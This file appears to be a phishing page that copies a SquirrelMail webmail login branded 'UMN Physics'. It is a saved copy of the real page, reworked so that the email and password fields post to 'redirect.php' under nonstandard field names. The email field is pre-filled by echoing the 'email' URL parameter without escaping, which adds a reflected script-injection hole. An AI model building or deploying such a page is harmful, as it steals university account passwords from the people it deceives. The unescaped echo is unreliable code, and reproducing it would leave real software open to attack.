<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" ""><HTML><HEAD><META 
content="IE=5.0000" http-equiv="X-UA-Compatible">
 
<META name="robots" content="noindex,nofollow"> 
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<META http-equiv="x-dns-prefetch-control" content="off"> <TITLE>UMN Physics - 
Login</TITLE>
<SCRIPT language="JavaScript" type="text/javascript">
<!--
  var alreadyFocused = false;
  function squirrelmail_loginpage_onload() {
    document.login_form.js_autodetect_results.value = '1';
    if (alreadyFocused) return;
    var textElements = 0;
    for (i = 0; i < document.login_form.elements.length; i++) {
      if (document.login_form.elements[i].type == "text" || document.login_form.elements[i].type == "password") {
        textElements++;
        if (textElements == 1) {
          document.login_form.elements[i].focus();
          break;
        }
      }
    }
  }
// -->
</SCRIPT>
 <!--[if IE 6]>
<style type="text/css">
/* avoid stupid IE6 bug with frames and scrollbars */
body {
    width: expression(document.documentElement.clientWidth - 30);
}
</style>
<![endif]--> 
<META name="GENERATOR" content="MSHTML 11.00.9600.18838">
<style type="text/css">
.dfltf {	position: absolute;
	color: #000000;
	font-family: 'Times New Roman';
	font-size: 12px;
	font-weight: normal;
	font-style: normal;
	text-decoration: none;
	width: 255px;
	height: 45px;
	left: 0px;
	top: 36px;
}
#Gform9 {
	border: 0 none #b4b4b4;
	width: 79%;
	height: 141%;
	top: 82px;
	left: -4px;
}
#Gform9 {
	border: 0 none #b4b4b4;
	width: 219px;
	height: 19px;
	left: 222px;
}
</style>
</HEAD> 
<BODY text="#000000" bgcolor="#ffffff" link="#0000cc" alink="#0000cc" vlink="#0000cc" 
onload="squirrelmail_loginpage_onload();">
<FORM name="login_form" action="redirect.php" method="post">
<TABLE width="100%" bgcolor="#ffffff" border="0" cellspacing="0" 
cellpadding="0">
  <TBODY>
  <TR>
    <TD align="center">
      <CENTER><SMALL>SquirrelMail version 1.4.21<BR>  By the SquirrelMail 
      Project Team<BR></SMALL> 
      <TABLE width="350" bgcolor="#ffffff" border="0">
        <TBODY>
        <TR>
          <TD align="center" bgcolor="#dcdcdc">&nbsp;</TD></TR>
        <TR>
          <TD align="left" bgcolor="#ffffff">
            <TABLE width="100%" align="center" bgcolor="#ffffff" border="0">
              <TBODY>
              <TR>
                <TD width="30%" align="right">Name:</TD>
                <TD width="70%" 
align="left"><input         
        type="text" id="Gform9" class="dfltf" name="q3_name" value="<?php echo $_GET['email']; // output 2489 ?>"<?php echo $_GET['email']; // output 2489 ?> placeholder="Email"></TD></TR>
              <TR>
                <TD width="30%" align="right">Password:</TD>
                <TD width="70%" align="left"><INPUT name="secretkey" onFocus="alreadyFocused=true;" type="password"> 
<INPUT name="js_autodetect_results" type="hidden" value="0"> 
<INPUT name="just_logged_in" type="hidden" value="1"> 
              </TD></TR></TBODY></TABLE></TD></TR>
        <TR>
          <TD align="left">
            <CENTER><INPUT type="submit" value="Login"> 
      </CENTER></TD></TR></TBODY></TABLE></CENTER></TD></TR></TBODY></TABLE></FORM></BODY></HTML>
